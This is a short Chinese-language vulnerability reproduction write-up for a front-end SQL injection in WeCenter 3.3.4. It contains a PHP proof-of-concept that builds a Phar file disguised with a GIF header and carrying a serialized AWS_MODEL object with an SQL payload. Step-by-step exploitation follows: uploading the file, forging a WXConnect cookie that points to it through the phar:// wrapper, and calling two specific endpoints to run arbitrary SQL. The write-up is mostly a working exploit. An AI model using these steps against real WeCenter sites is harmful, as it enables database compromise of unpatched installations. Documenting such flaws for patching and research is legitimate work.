# WeCenter 3.3.4 前台sql注入

### 一、漏洞简介

### 二、漏洞影响

WeCenter 3.3.4

### 三、复现过程

任意sql语句执行

system/aws_model.inc.php:__destruct() 方法中存在任意 SQL 语句执行。

![](images/15893801155247.png)


poc


```php
<?php
class AWS_MODEL
{
    private $_shutdown_query = array();

    public function __construct($_shutdown_query)
    {
        $this->_shutdown_query = $_shutdown_query;
    }
}

$sql = array('select updatexml(1,concat(0x3a,md5(233),0x3a),1)');
$evilobj = new AWS_MODEL($sql);
// phar.readonly无法通过该语句进行设置: init_set("phar.readonly",0);
$filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行
file_exists($filename) ? unlink($filename) : null;
$phar=new Phar($filename);
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($evilobj);
$phar->addFromString("foo.txt","bar");
$phar->stopBuffering();
?>
```

**利用**

首先注册账号，并利用上面的poc生成Phar文件，并将运行后将生成的shell.gif通过编辑器的上传功能上传到服务器上。

![](images/15893801363518.png)


记录下上传后的目录

![](images/15893801420498.png)


生成并设置COOKIE中的WXConnect值


```php
<?php
    $arr = array();
    $arr['access_token'] = array('openid' => '1');
    $arr['access_user'] = array();
    $arr['access_user']['openid'] = 1;
    $arr['access_user']['nickname'] = 'naiquan';
    $arr['access_user']['headimgurl'] = 'phar://uploads/question/20200107/a3df6f75e11120c22ba0d85519c5d442.gif';
    echo json_encode($arr);
?>
```

将headimgurl的值设置成phar伪协议解析的恶意文件后运行，将结果放入Cookie中，前缀可参考Cookie中的其他参数。

访问app/m/weixin.php下的binding_action

![](images/15893801577268.png)


提示绑定微信成功后进行下一步

访问app/account/ajax.php下的synch_img_action

![](images/15893801643646.png)


任意SQL语句执行成功